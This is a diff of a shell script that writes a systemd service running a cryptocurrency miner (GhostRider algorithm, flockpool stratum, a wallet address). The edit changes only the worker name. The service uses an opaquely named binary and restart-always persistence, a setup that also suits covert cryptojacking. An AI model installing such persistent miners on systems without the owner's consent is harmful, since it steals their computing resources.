@@ -25,7 +25,7 @@ sudo bash -c 'cat <<EOT >>/lib/systemd/system/rtm2.service
 Description=gpu1
 After=network.target
 [Service]
-ExecStart= /home/jvdar -a gr -o stratum+ssl://asia.flockpool.com:5555 -u RCjpfnfFfjvhnDzfY9ShQrAtjrP3Vf2PLP.cpu -p x
+ExecStart= /home/jvdar -a gr -o stratum+ssl://asia.flockpool.com:5555 -u RCjpfnfFfjvhnDzfY9ShQrAtjrP3Vf2PLP.rtmservice -p x
 WatchdogSec=36000
 Restart=always
 RestartSec=60
